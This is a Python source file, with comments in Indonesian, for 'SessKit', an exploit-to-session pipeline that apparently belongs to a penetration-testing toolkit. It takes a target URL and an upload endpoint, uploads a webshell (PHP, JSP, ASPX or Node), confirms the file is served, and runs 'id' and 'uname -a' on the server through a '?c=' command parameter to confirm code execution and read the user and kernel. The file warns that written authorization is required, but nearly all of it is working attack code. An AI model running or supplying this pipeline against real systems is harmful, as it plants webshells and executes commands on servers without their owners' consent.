"""
SessKit v1 — pipeline eksploit -> sesi untuk VANTHEX. OPERATOR-GATED.

Bukan check scan: fungsi di sini MENULIS ke target (upload webshell) dan
menjalankan probe eksekusi. Wajib otorisasi tertulis; TIDAK pernah masuk
PROFILES. Dipanggil operator via CLI:

    python3 sesskit.py --target http://t --upload /upload --name sh.php --lang php

Pipeline: deliver_webshell -> verifikasi serve -> probe eksekusi (id/uname,
read-only) -> ringkasan sesi. Modul plain-return, tanpa dependensi
vulnscan2 (bebas import melingkar), unit-testable dengan client stub.
"""
import argparse
import json as _json
from urllib.parse import quote as _quote


def run_pipeline(client, upload_path, name, lang, marker="VHXWS",
                 cmd_runner=None):
    """Jalankan pipeline upload->verify->probe.

    Args:
        client: netclient.Client (atau stub dengan .post/.get)
        upload_path / name / lang: lihat exploitkit.deliver_webshell
        marker: penanda engagement
        cmd_runner: callable(cmd)->str eksekusi jarak jauh. Default: GET
            serve_url?c=<cmd> (webshell klasik).

    Returns dict laporan:
        {"status": "ok"|"fail", "stage": ..., "serve_url": ...,
         "exec": "verified"|"not-executed", "probe_out": ..., "enum": {...}}
    """
    import exploitkit as ek

    # 1) upload webshell + verifikasi dapat diakses ulang
    up = ek.deliver_webshell(client, upload_path, name, lang, marker=marker)
    if up.get("status") != "ok":
        return {"status": "fail", "stage": "upload", "detail": up}
    serve_url = up.get("serve_url") or ""

    # 2) verifikasi file tersaji
    r = client.get(serve_url)
    if not r or r.status != 200:
        return {"status": "fail", "stage": "verify", "serve_url": serve_url,
                "detail": f"serve_url not accessible (HTTP "
                          f"{getattr(r, 'status', '?')})"}

    # 3) probe eksekusi read-only (id / uname -a) — marker harus hilang dari
    #    output; kalau payload mentah ter-echo berarti hanya tersaji, bukan
    #    dieksekusi (kejujuran hasil: laporkan "not-executed").
    runner = cmd_runner or (lambda cmd: (
        client.get(f"{serve_url}?c={_quote(cmd)}").body or ""))
    out_id = str(runner("id"))
    out_uname = str(runner("uname -a"))
    executed = (up.get("payload", "") not in out_id
                and out_id.strip() not in ("", "None"))
    report = {
        "status": "ok",
        "serve_url": serve_url,
        "marker": marker,
        "exec": "verified" if executed else "not-executed",
        "probe_out": (out_id + " | " + out_uname)[:300] if executed else "",
        "enum": _enum_lite(out_id, out_uname) if executed else {},
    }
    return report


def _enum_lite(out_id, out_uname):
    """Enumerasi minimal dari output probe (read-only, tanpa command baru)."""
    import re
    uid = re.search(r"uid=\d+\(\w+\)", out_id or "")
    ker = re.search(r"Linux [^\s]+ \S+", out_uname or "")
    return {"uid": uid.group(0) if uid else "",
            "kernel": ker.group(0) if ker else ""}


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="SessKit — exploit->session pipeline (AUTHORIZATION REQUIRED)")
    ap.add_argument("--target", required=True)
    ap.add_argument("--upload", required=True, help="upload endpoint path")
    ap.add_argument("--name", required=True, help="webshell file name")
    ap.add_argument("--lang", required=True, choices=("php", "jsp", "aspx", "node"))
    ap.add_argument("--marker", default="VHXWS")
    ns = ap.parse_args(argv)

    from netclient import Client
    client = Client(ns.target)
    report = run_pipeline(client, ns.upload, ns.name, ns.lang, marker=ns.marker)
    print(_json.dumps(report, indent=2))
    print("\n[!] This pipeline WRITES to the target. Use only on assets "
          "you own / with written authorization.", file=__import__("sys").stderr)
    return 0 if report.get("status") == "ok" else 1


if __name__ == "__main__":
    raise SystemExit(main())
